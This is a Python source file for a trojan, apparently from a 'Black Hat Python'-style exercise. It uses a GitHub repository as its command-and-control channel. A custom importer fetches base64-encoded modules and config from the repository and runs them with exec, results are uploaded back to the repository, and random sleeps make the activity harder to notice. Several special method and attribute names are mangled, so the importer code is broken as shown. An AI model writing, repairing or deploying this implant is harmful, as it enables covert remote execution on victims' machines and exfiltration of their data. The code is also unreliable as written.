import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime
def github_connect():
    with open('mytoken.txt') as f:
        token = f.read().strip()
    user = 'gn18112003-creator'
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan')
def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        for task in config:
            if task['module'] not in sys.modules:
                importlib.import_module(task['module'])
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, bindata)

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner,args = (task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30 * 60, 3 * 60 * 60))

class GitImporter(importlib.abc.MetaPathFinder, importlib.abc.Loader):
    def _init_(self):
        self._module_codes = {}

    def find_spec(self, name, path, target=None):
        print(f"[*] Attempting to retrieve {name}")
        repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', repo)
        if new_library is not None:
            self._module_codes[name] = base64.b64decode(new_library)
            return importlib.util.spec_from_loader(name, loader=self)
        return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        code = self.module_codes.get(module.name_, b"")
        exec(compile(code, f'<github:{module._name}>', 'exec'), module.dict_)

if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
